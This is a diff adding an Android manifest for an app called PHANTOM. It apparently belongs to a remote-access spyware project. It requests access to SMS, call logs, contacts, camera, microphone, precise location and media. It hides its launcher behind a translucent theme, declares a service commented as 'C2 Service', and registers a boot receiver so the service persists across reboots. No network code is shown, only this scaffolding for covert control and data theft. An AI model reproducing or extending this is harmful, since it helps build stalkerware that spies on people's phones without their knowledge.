@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    package="com.tenix.phantom">
+
+    <!-- Network -->
+    <uses-permission android:name="android.permission.INTERNET" />
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
+    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <!-- Foreground Service -->
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
+
+    <!-- Storage (old) -->
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"
+        android:maxSdkVersion="32" />
+
+    <!-- Storage (new API 33+) -->
+    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
+    <uses-permission android:name="android.permission.READ_MEDIA_VIDEO" />
+    <uses-permission android:name="android.permission.READ_MEDIA_AUDIO" />
+
+    <!-- Camera + Mic -->
+    <uses-permission android:name="android.permission.CAMERA" />
+    <uses-permission android:name="android.permission.RECORD_AUDIO" />
+    <uses-feature android:name="android.hardware.camera" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.autofocus" android:required="false" />
+    <uses-feature android:name="android.hardware.camera.flash" android:required="false" />
+
+    <!-- Location -->
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <!-- Contacts, SMS, Call Log -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.READ_CALL_LOG" />
+
+    <!-- Phone number -->
+    <uses-permission android:name="android.permission.READ_PHONE_STATE" />
+
+    <!-- Brightness / System settings -->
+    <uses-permission android:name="android.permission.WRITE_SETTINGS" />
+
+    <!-- Wallpaper -->
+    <uses-permission android:name="android.permission.SET_WALLPAPER" />
+
+    <!-- Boot -->
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <application
+        android:label="PHANTOM"
+        android:theme="@android:style/Theme.Translucent.NoTitleBar"
+        android:allowBackup="false"
+        android:icon="@android:drawable/sym_def_app_icon">
+
+        <!-- Transparent launcher Activity -->
+        <activity
+            android:name=".MainActivity"
+            android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:exported="true"
+            android:launchMode="singleTop">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!-- C2 Service -->
+        <service
+            android:name=".inq"
+            android:foregroundServiceType="dataSync"
+            android:exported="false" />
+
+        <!-- Boot receiver -->
+        <receiver
+            android:name=".inq$BootReceiver"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+            </intent-filter>
+        </receiver>
+
+    </application>
+</manifest>
